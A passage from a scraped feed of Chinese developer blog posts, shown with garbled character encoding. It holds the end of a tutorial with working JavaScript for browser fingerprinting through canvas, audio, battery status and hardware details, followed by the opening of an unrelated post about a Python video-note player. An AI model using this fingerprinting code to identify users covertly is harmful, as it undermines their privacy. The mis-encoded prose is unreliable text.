    <span class="hljs-keyword">const</span> b64 = canvas.<span class="hljs-title function_">toDataURL</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-string">"data:image/png;base64,"</span>, <span class="hljs-string">""</span>);
    
    <span class="hljs-comment">// 5. å°†è¶…é•¿å­—ç¬¦ä¸² Hash åŒ– (è¿™é‡Œç”¨ç®€å•çš„ hash ç¤ºä¾‹ï¼Œç”Ÿäº§ç¯å¢ƒå¯ç”¨ MurmurHash3)</span>
    <span class="hljs-keyword">let</span> bin = <span class="hljs-title function_">atob</span>(b64);
    <span class="hljs-keyword">let</span> crc = <span class="hljs-title function_">bin2hex</span>(bin.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">16</span>, -<span class="hljs-number">12</span>)); <span class="hljs-comment">// å–éƒ¨åˆ†æ ¡éªŒä½</span>
    <span class="hljs-keyword">return</span> crc;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60552ddafb5c453bbf111e2e8dbadc93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=zMjOwJ4R07Zdct%2FnFSHJIQDfmHE%3D" alt="image.png" loading="lazy"/></p>
<p>å·®å¼‚åœ¨å“ªï¼Ÿ</p>
<p>è‚‰çœ¼çœ‹è¿™ä¸¤å¼ å›¾æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p>
<p>ä½†å¦‚æœä½ æŠŠä¸¤å°ç”µè„‘ç”Ÿæˆçš„ Base64 å­—ç¬¦ä¸²æ‹¿å»å¯¹æ¯”ï¼Œä¼šå‘ç°å¯èƒ½åœ¨ç¬¬ 5000 ä¸ªå­—ç¬¦å¤„ï¼Œæœ‰ä¸€ä¸ªå­—æ¯ä¸ä¸€æ ·ã€‚é‚£å°±æ˜¯æ˜¾å¡ç•™ä¸‹çš„ç­¾åã€‚</p>
<hr/>
<h3 data-id="heading-4">AudioContext æŒ‡çº¹</h3>
<p>æ—¢ç„¶æ˜¾å¡æœ‰å·®å¼‚ï¼Œå£°å¡ï¼ˆAudio Stackï¼‰è‡ªç„¶ä¹Ÿæœ‰ã€‚</p>
<h4 data-id="heading-5">åŸç†</h4>
<p>Audio æŒ‡çº¹ä¸æ˜¯å½•éŸ³ï¼ˆä¸éœ€è¦éº¦å…‹é£æƒé™ï¼‰ã€‚</p>
<p>å®ƒæ˜¯åˆ©ç”¨ Web Audio API ç”Ÿæˆä¸€æ®µæ•°å­¦ä¸Šçš„å£°éŸ³ä¿¡å·ï¼ˆæ­£å¼¦æ³¢ã€ä¸‰è§’æ³¢ï¼‰ï¼Œç„¶åç»è¿‡ä¸€ç³»åˆ—å¤„ç†ï¼ˆå‹ç¼©ã€æ»¤æ³¢ï¼‰ã€‚</p>
<p>ç”±äºè®¡ç®—æœºæµ®ç‚¹æ•°è¿ç®—çš„ç²¾åº¦å·®å¼‚ï¼Œä»¥åŠåº•å±‚éŸ³é¢‘å¤„ç†å•å…ƒï¼ˆDSPï¼‰çš„å®ç°ä¸åŒï¼Œæœ€ç»ˆç”Ÿæˆçš„<strong>PCM éŸ³é¢‘æ•°æ®æµ</strong>ä¼šæœ‰æå…¶å¾®å°çš„å·®åˆ«ã€‚</p>
<h4 data-id="heading-6">ä»£ç å®ç°</h4>
<p>é€šå¸¸ä½¿ç”¨ <code>OfflineAudioContext</code><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FOfflineAudioContext" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/OfflineAudioContext" ref="nofollow noopener noreferrer">ï¼ˆç¦»çº¿éŸ³é¢‘ä¸Šä¸‹æ–‡ï¼‰</a>ï¼Œå®ƒå¯ä»¥åœ¨åå°é™é»˜æ¸²æŸ“éŸ³é¢‘ï¼Œä¸éœ€è¦ç”¨æˆ·å¬åˆ°å£°éŸ³ï¼Œé€Ÿåº¦æå¿«ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAudioFingerprint</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å…¼å®¹æ€§å¤„ç†</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">AudioContext</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">OfflineAudioContext</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitOfflineAudioContext</span>;
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">AudioContext</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 1. åˆ›å»ºç¦»çº¿ä¸Šä¸‹æ–‡ï¼š1ä¸ªå£°é“ï¼Œ44100é‡‡æ ·ç‡ï¼Œ5000å¸§</span>
    <span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AudioContext</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5000</span>, <span class="hljs-number">44100</span>);

    <span class="hljs-comment">// 2. åˆ›å»ºæŒ¯è¡å™¨ (Oscillator)</span>
    <span class="hljs-comment">// ä¸‰è§’æ³¢ (triangle) æ¯”æ­£å¼¦æ³¢æ›´å®¹æ˜“æš´éœ²ç¡¬ä»¶å¤„ç†çš„éçº¿æ€§å·®å¼‚</span>
    <span class="hljs-keyword">const</span> oscillator = context.<span class="hljs-title function_">createOscillator</span>();
    oscillator.<span class="hljs-property">type</span> = <span class="hljs-string">'triangle'</span>;
    oscillator.<span class="hljs-property">frequency</span>.<span class="hljs-property">value</span> = <span class="hljs-number">10000</span>;

    <span class="hljs-comment">// 3. åˆ›å»ºåŠ¨æ€å‹ç¼©å™¨ (Compressor) - æ ¸å¿ƒæ­¥éª¤</span>
    <span class="hljs-comment">// å‹ç¼©å™¨çš„ç®—æ³•åœ¨ä¸åŒæµè§ˆå™¨/ç¡¬ä»¶ä¸Šå®ç°å·®å¼‚å¾ˆå¤§</span>
    <span class="hljs-keyword">const</span> compressor = context.<span class="hljs-title function_">createDynamicsCompressor</span>();
    compressor.<span class="hljs-property">threshold</span>.<span class="hljs-property">value</span> = -<span class="hljs-number">50</span>;
    compressor.<span class="hljs-property">knee</span>.<span class="hljs-property">value</span> = <span class="hljs-number">40</span>;
    compressor.<span class="hljs-property">ratio</span>.<span class="hljs-property">value</span> = <span class="hljs-number">12</span>;
    compressor.<span class="hljs-property">reduction</span>.<span class="hljs-property">value</span> = -<span class="hljs-number">20</span>;

    <span class="hljs-comment">// 4. è¿æ¥èŠ‚ç‚¹ï¼šæŒ¯è¡å™¨ -&gt; å‹ç¼©å™¨ -&gt; è¾“å‡º</span>
    oscillator.<span class="hljs-title function_">connect</span>(compressor);
    compressor.<span class="hljs-title function_">connect</span>(context.<span class="hljs-property">destination</span>);

    <span class="hljs-comment">// 5. å¼€å§‹æ¸²æŸ“</span>
    oscillator.<span class="hljs-title function_">start</span>(<span class="hljs-number">0</span>);
    context.<span class="hljs-title function_">startRendering</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">buffer</span> =&gt;</span> {
        <span class="hljs-comment">// 6. è·å–æ¸²æŸ“åçš„ PCM æ•°æ®</span>
        <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ª Float32Array æ•°ç»„</span>
        <span class="hljs-keyword">const</span> data = buffer.<span class="hljs-title function_">getChannelData</span>(<span class="hljs-number">0</span>);
        
        <span class="hljs-comment">// 7. è®¡ç®— Hash</span>
        <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
        <span class="hljs-comment">// ç®€å•ç´¯åŠ æ‰€æœ‰é‡‡æ ·ç‚¹çš„ç»å¯¹å€¼ï¼Œä½œä¸ºæŒ‡çº¹</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
            sum += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(data[i]);
        }
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Audio Fingerprint:"</span>, sum);
    });
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/743bc6a8545d48fc86df91be65b27085~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=ByTKhYxC2hWLTCBDBeZ%2Fp8ivHeI%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸åŒè®¾å¤‡è·‘å‡ºæ¥çš„ <code>sum</code> å€¼ï¼Œä¼šç²¾ç¡®åˆ°å°æ•°ç‚¹ååå‡ ä½ï¼Œé‚£ä¸ªå¾®å°çš„å°¾æ•°å·®å¼‚å°±æ˜¯æŒ‡çº¹ã€‚</p>
<hr/>
<h3 data-id="heading-7">ç”µæ± ä¸ç¡¬ä»¶å¹¶å‘</h3>
<p>å…‰æœ‰ Canvas å’Œ Audio è¿˜ä¸å¤Ÿï¼ˆå› ä¸ºåŒä¸€å‹å·çš„ iPhone å¯èƒ½ä¼šå®Œå…¨ä¸€æ ·ï¼‰ã€‚è¿™æ—¶å€™éœ€è¦å¼•å…¥<strong>åŠ¨æ€ç¡¬ä»¶ç‰¹å¾</strong>æ¥å¢åŠ ç†µå€¼ã€‚</p>
<h4 data-id="heading-8">ç”µæ± ç”µé‡ API <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FBattery_Status_API" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Battery_Status_API" ref="nofollow noopener noreferrer">(Battery Status API)</a></h4>
<p><em>æ³¨ï¼šç”±äºéšç§äº‰è®®å¤ªå¤§ï¼ŒFirefox å’Œ Safari å·²ç¦ç”¨ï¼Œä½† Chrome (éƒ¨åˆ†ç‰ˆæœ¬) å’Œ Android Webview ä¸­ä¾ç„¶å¯èƒ½è·å–ã€‚</em></p>
<p>è¿™ç©æ„çš„é€»è¾‘éå¸¸ç²—æš´ï¼š</p>
<p><strong>ç”µé‡ç™¾åˆ†æ¯”, å……ç”µ/æ”¾ç”µæ—¶é—´</strong> è¿™ä¸ªç»„åˆåœ¨ç‰¹å®šæ—¶é—´ç‚¹æ˜¯æå…·å”¯ä¸€æ€§çš„ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// æ ¸å¿ƒä»£ç </span>
navigator.<span class="hljs-title function_">getBattery</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">battery</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> level = battery.<span class="hljs-property">level</span>; <span class="hljs-comment">// ä¾‹å¦‚ 0.55</span>
    <span class="hljs-keyword">const</span> chargingTime = battery.<span class="hljs-property">chargingTime</span>; <span class="hljs-comment">// ä¾‹å¦‚ 1200 (ç§’)</span>
    <span class="hljs-keyword">const</span> dischargingTime = battery.<span class="hljs-property">dischargingTime</span>; <span class="hljs-comment">// ä¾‹å¦‚ Infinity</span>
    
    <span class="hljs-comment">// æŒ‡çº¹å› å­ï¼š0.55_1200_Infinity</span>
    <span class="hljs-comment">// ç»“åˆ IPï¼Œèƒ½æŠŠç”¨æˆ·é”å®šå¾—æ­»æ­»çš„</span>
    <span class="hljs-keyword">const</span> batteryFingerprint = <span class="hljs-string">`<span class="hljs-subst">${level}</span>_<span class="hljs-subst">${chargingTime}</span>_<span class="hljs-subst">${dischargingTime}</span>`</span>;
});
</code></pre>
<p>å¦‚æœæˆ‘åœ¨ 1 åˆ†é’Ÿå†…è¿ç»­è¯·æ±‚ä¸¤æ¬¡ï¼Œå‘ç°ä½ çš„ç”µé‡ä» <code>0.42</code> å˜æˆäº† <code>0.41</code>ï¼Œè¿™ä¸ª<strong>å˜åŒ–æ›²çº¿</strong>ä¹Ÿæ˜¯ä¸€ç§å¼ºæŒ‡çº¹ã€‚</p>
<h4 data-id="heading-9">ç¡¬ä»¶å¹¶å‘æ•°ä¸å†…å­˜</h4>
<p>è¿™äº›æ˜¯ <code>Navigator</code> å¯¹è±¡ä¸Šèµ¤è£¸è£¸çš„ç¡¬ä»¶å‚æ•°ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> hardwareInfo = [
    navigator.<span class="hljs-property">hardwareConcurrency</span>, <span class="hljs-comment">// CPU æ ¸å¿ƒæ•°ï¼Œå¦‚ 12</span>
    navigator.<span class="hljs-property">deviceMemory</span>,        <span class="hljs-comment">// å†…å­˜å¤§å° (GB)ï¼Œå¦‚ 8</span>
    screen.<span class="hljs-property">width</span> + <span class="hljs-string">'x'</span> + screen.<span class="hljs-property">height</span>, <span class="hljs-comment">// åˆ†è¾¨ç‡</span>
    screen.<span class="hljs-property">colorDepth</span>,             <span class="hljs-comment">// è‰²å½©æ·±åº¦ï¼Œå¦‚ 24</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>        <span class="hljs-comment">// åƒç´ æ¯”ï¼Œå¦‚ 2</span>
].<span class="hljs-title function_">join</span>(<span class="hljs-string">'_'</span>);

<span class="hljs-comment">// è¾“å‡ºç¤ºä¾‹ï¼š12_8_2560x1440_24_2</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b9a7adce84c45e995a207814a7b724c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=vUI70Z3yKqcamv%2BrEsJgTANaYeM%3D" alt="image.png" loading="lazy"/></p>
<p>è™½ç„¶è¿™äº›å‚æ•°å•çœ‹å¾ˆæ™®é€šï¼Œä½†å¦‚æœä½ æŠŠ <strong>CPU + å†…å­˜ + åˆ†è¾¨ç‡ + CanvasæŒ‡çº¹ + AudioæŒ‡çº¹</strong> æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå…¨çƒå‡ åäº¿è®¾å¤‡ä¸­ï¼Œèƒ½å’Œä½ æ’è½¦çš„æ¦‚ç‡ï¼Œå‡ ä¹ä¸ºé›¶ã€‚</p>
<hr/>
<p>æ‰€è°“çš„å‰ç«¯æŒ‡çº¹æŠ€æœ¯ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯<strong>æ‰¾ä¸åŒ</strong>çš„ä¸€ç§æ–¹å¼ã€‚</p>
<p>å¼€å‘è€…åˆ©ç”¨ä¸€åˆ‡å¯ä»¥è°ƒç”¨çš„ APIï¼ˆCanvas, Audio, WebGL, ç¡¬ä»¶ä¿¡æ¯ï¼‰ï¼Œå¼ºè¿«æµè§ˆå™¨è¿›è¡ŒæŸç§å¤æ‚çš„è¿ç®—ã€‚ç”±äºç¡¬ä»¶å’Œé©±åŠ¨çš„ç»†å¾®å·®åˆ«ï¼Œè¿ç®—ç»“æœå¿…ç„¶å­˜åœ¨å·®å¼‚ã€‚</p>
<p>è¿™äº›å·®å¼‚è¢«æ”¶é›†èµ·æ¥ï¼Œç”Ÿæˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><strong>è¿™å°±æ˜¯æµè§ˆå™¨åœ¨äº’è”ç½‘ä¸Šçš„å”¯ä¸€ID</strong>ï¼Œå¸Œæœ›å¯¹ä½ ä»¬æœ‰å¸®åŠ©ï¼</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FErpanOmer" target="_blank" title="https://github.com/ErpanOmer" ref="nofollow noopener noreferrer">å¦‚æœå–œæ¬¢æˆ‘çš„å†…å®¹ï¼Œå¸Œæœ›ç»™ä¸ªStart ğŸ˜ğŸ‘‰â­Github</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19692b879bbe4e969fdc7263789258cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=fmll0ink%2FHyuDt6BA%2F2woh4phTU%3D" alt="è°¢è°¢å¤§å®¶.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¿˜åœ¨çœ‹è§†é¢‘æ—¶åˆ‡æ¥åˆ‡å»è®°ç¬”è®°ï¼Ÿæˆ‘ç”¨ Python å†™äº†ä¸ªå¸¦æ—¶é—´æˆ³çš„æ’­æ”¾å™¨ï¼Œæ•ˆç‡æå‡ 10 å€]]></title>    <link>https://juejin.cn/post/7596919439019786249</link>    <guid>https://juejin.cn/post/7596919439019786249</guid>    <pubDate>2026-01-20T01:23:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019786249" data-draft-id="7596890557546250286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¿˜åœ¨çœ‹è§†é¢‘æ—¶åˆ‡æ¥åˆ‡å»è®°ç¬”è®°ï¼Ÿæˆ‘ç”¨ Python å†™äº†ä¸ªå¸¦æ—¶é—´æˆ³çš„æ’­æ”¾å™¨ï¼Œæ•ˆç‡æå‡ 10 å€"/> <meta itemprop="keywords" content="Python,PyQt"/> <meta itemprop="datePublished" content="2026-01-20T01:23:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Schuyler2025"/> <meta itemprop="url" content="https://juejin.cn/user/605198468525913"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¿˜åœ¨çœ‹è§†é¢‘æ—¶åˆ‡æ¥åˆ‡å»è®°ç¬”è®°ï¼Ÿæˆ‘ç”¨ Python å†™äº†ä¸ªå¸¦æ—¶é—´æˆ³çš„æ’­æ”¾å™¨ï¼Œæ•ˆç‡æå‡ 10 å€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/605198468525913/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Schuyler2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:23:28.000Z" title="Tue Jan 20 2026 01:23:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç—›ç‚¹ï¼šå­¦ä¹ è§†é¢‘æ—¶çš„ç¬”è®°å™©æ¢¦</h2>
<p>ä½ æ˜¯ä¸æ˜¯ä¹Ÿç»å†è¿‡è¿™æ ·çš„åœºæ™¯ï¼š</p>
<p>åˆ·æŠ€æœ¯æ•™ç¨‹ã€çœ‹è¯¾ç¨‹å½•åƒã€å­¦ä¹ ç¼–ç¨‹è§†é¢‘æ—¶ï¼Œéœ€è¦é¢‘ç¹åœ¨<strong>è§†é¢‘æ’­æ”¾å™¨</strong>å’Œ<strong>ç¬”è®°è½¯ä»¶</strong>ä¹‹é—´åˆ‡æ¢ï¼š</p>
<ul>
<li>çœ‹åˆ°é‡ç‚¹å†…å®¹ï¼Œæš‚åœè§†é¢‘ â†’ åˆ‡åˆ°ç¬”è®°è½¯ä»¶ â†’ è®°å½•è¦ç‚¹ â†’ æ‰‹åŠ¨è¾“å…¥æ—¶é—´æˆ³ â†’ åˆ‡å›è§†é¢‘ç»§ç»­çœ‹</li>
<li>ç¨å¾®ä¸€ä¸ç•™ç¥ï¼Œåˆå¾—æ¥å›æ‹–åŠ¨è¿›åº¦æ¡å®šä½</li>
<li>å¤šä¸ªå­¦ä¹ è§†é¢‘æ··åœ¨ä¸€èµ·ï¼Œç¬”è®°ç®¡ç†æ··ä¹±ï¼Œæƒ³å›é¡¾æŸä¸ªçŸ¥è¯†ç‚¹æ‰¾ä¸åˆ°åœ¨å“ª</li>
</ul>
<p>è¿™ç§"åˆ‡æ¢-è®°å½•-å†åˆ‡æ¢"çš„å¾ªç¯ï¼Œä¸ä»…æ‰“æ–­å­¦ä¹ èŠ‚å¥ï¼Œè¿˜å®¹æ˜“é—æ¼å…³é”®ä¿¡æ¯ã€‚å¦‚æœèƒ½åœ¨çœ‹è§†é¢‘çš„åŒæ—¶ï¼Œç›´æ¥åœ¨æ—è¾¹è®°ç¬”è®°ï¼Œå¹¶ä¸”èƒ½<strong>ä¸€é”®è·³è½¬åˆ°è§†é¢‘å¯¹åº”ä½ç½®</strong>ï¼Œè¯¥å¤šå¥½ï¼Ÿ</p>
<p>äºæ˜¯æˆ‘èŠ±äº†ç‚¹æ—¶é—´ï¼Œç”¨ Python å†™äº†ä¸€ä¸ª<strong>è§†é¢‘æ’­æ”¾å™¨ç¬”è®°åº”ç”¨</strong>ï¼Œå®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f743486bbd8b4e8cbaac7eefa3ac7f57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2NodXlsZXIyMDI1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477007&amp;x-signature=xsYAYqHbl%2BHXl%2BZWlauhiOqLagw%3D" alt="test.gif" loading="lazy"/></p>
<h2 data-id="heading-1">æ ¸å¿ƒåŠŸèƒ½è®¾è®¡</h2>
<p>è¿™ä¸ªåº”ç”¨ä¸»è¦è§£å†³äº†ä¸‰ä¸ªæ ¸å¿ƒç—›ç‚¹ï¼š</p>
<h3 data-id="heading-2">1. è§†é¢‘æ’­æ”¾ä¸ç¬”è®°ä¸€ä½“åŒ–</h3>
<ul>
<li>å·¦ä¾§æ˜¯è§†é¢‘æ’­æ”¾åŒºåŸŸï¼Œå³ä¾§æ˜¯ Markdown ç¬”è®°ç¼–è¾‘å™¨</li>
<li>æ”¯æŒå¸¸è§è§†é¢‘æ ¼å¼ï¼ˆMP4ã€AVIã€MKVã€MOV ç­‰ï¼‰</li>
<li>å…¨é”®ç›˜æ“ä½œï¼ŒåŒæ‰‹ä¸ç¦»é”®ç›˜å°±èƒ½å®Œæˆæ‰€æœ‰æ“ä½œ</li>
</ul>
<h3 data-id="heading-3">2. æ—¶é—´æˆ³è‡ªåŠ¨å…³è”</h3>
<ul>
<li>æŒ‰ <code>Ctrl+T</code> ä¸€é”®æ’å…¥å½“å‰è§†é¢‘æ—¶é—´æˆ³</li>
<li>ç‚¹å‡»ç¬”è®°ä¸­çš„æ—¶é—´æˆ³ï¼Œè§†é¢‘è‡ªåŠ¨è·³è½¬åˆ°å¯¹åº”ä½ç½®</li>
<li>ç¬”è®°å’Œè§†é¢‘ä½ç½®åŒå‘ç»‘å®šï¼Œå›é¡¾ç¬”è®°æ—¶å¯ä»¥å¿«é€Ÿå®šä½è§†é¢‘å†…å®¹</li>
</ul>
<h3 data-id="heading-4">3. é¡¹ç›®åŒ–ç®¡ç†</h3>
<ul>
<li>æ¯ä¸ªè§†é¢‘è‡ªåŠ¨åˆ›å»ºç‹¬ç«‹é¡¹ç›®</li>
<li>ç¬”è®°è‡ªåŠ¨ä¿å­˜ï¼Œæ— éœ€æ‰‹åŠ¨æ“ä½œ</li>
<li>æ”¯æŒ Markdown/HTML å¯¼å‡ºï¼Œæ–¹ä¾¿åˆ†äº«</li>
</ul>
